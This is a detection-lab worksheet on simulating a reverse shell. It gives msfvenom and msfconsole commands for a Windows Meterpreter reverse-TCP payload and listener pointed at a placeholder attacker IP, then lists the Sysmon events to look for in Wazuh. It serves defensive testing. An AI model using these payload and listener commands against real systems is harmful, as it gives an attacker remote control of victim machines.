# Attack 03 — Reverse Shell (MITRE T1059)

## Objective
Get a reverse shell on a victim and detect the anomalous process/connection.

## Attack (from Kali)
```bash
# Generate payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<kali-ip> LPORT=4444 -f exe -o shell.exe

# Listener
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST <kali-ip>; set LPORT 4444; run"
```
Transfer + run `shell.exe` on the Windows victim (simulating execution).

## What to look for in Wazuh (Sysmon powered)
- Sysmon Event ID 1 (process creation) — unusual parent/child
- Sysmon Event ID 3 (network connection) — outbound to Kali:4444
- New process spawned from an unexpected location

## Evidence
_Add screenshot: `screenshots/03-revshell-*.png`_

## Detection
- Caught by default rules? ⬜ yes / ⬜ no
- Custom rule written: _link if applicable_

## Notes
_Which Sysmon events were most useful; how you'd alert on this in production._
